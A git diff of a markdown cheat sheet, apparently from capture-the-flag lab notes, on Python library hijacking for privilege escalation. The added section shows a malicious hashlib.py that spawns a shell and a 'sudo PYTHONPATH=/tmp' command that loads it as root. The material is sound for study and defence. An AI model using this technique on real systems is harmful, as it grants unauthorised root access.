@@ -1,6 +1,6 @@
 # Python Library Hijack (PYTHONPATH / Working Directory)
 
-Used on: **bsidesgtlibrary**
+Used on: **bsidesgtlibrary, biblioteca**
 
 When a Python script is executed with `sudo`, and the attacker controls either the `PYTHONPATH` environment variable or the working directory from which the script is executed, they can hijack module imports. Python prioritizes the current working directory (or paths in `PYTHONPATH`) over system libraries. By creating a malicious Python module with the same name as an imported library (e.g., `zipfile.py`), the attacker's code runs as root when the script imports it.
 
@@ -65,6 +65,21 @@ sudo /usr/bin/python /home/meliodas/bak.py
 ```
 
 The script imports your `zipfile.py` instead of the system `zipfile` module, executing your reverse shell as root.
+
+### 4. Variant: SETENV / PYTHONPATH injection
+
+If `sudo -l` shows `SETENV: NOPASSWD`, you can explicitly point Python's library path to a directory you control (like `/tmp`) by setting the `PYTHONPATH` variable in the `sudo` command.
+
+```bash
+# In /tmp/hashlib.py
+import os
+os.system("/bin/bash")
+```
+
+```bash
+# Run the target script, forcing it to load libraries from /tmp
+sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/script/hasher.py
+```
 
 ## Defensive Notes
 
